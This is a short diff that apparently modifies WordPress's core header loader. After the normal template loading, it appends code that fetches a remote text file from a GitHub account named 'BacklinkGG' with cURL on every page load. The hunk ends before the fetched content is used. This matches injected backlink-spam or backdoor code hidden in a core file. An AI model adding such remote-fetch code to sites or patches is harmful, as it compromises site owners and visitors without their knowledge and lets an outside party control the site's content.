@@ -19,6 +19,8 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
+?>
+<?php
 $url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
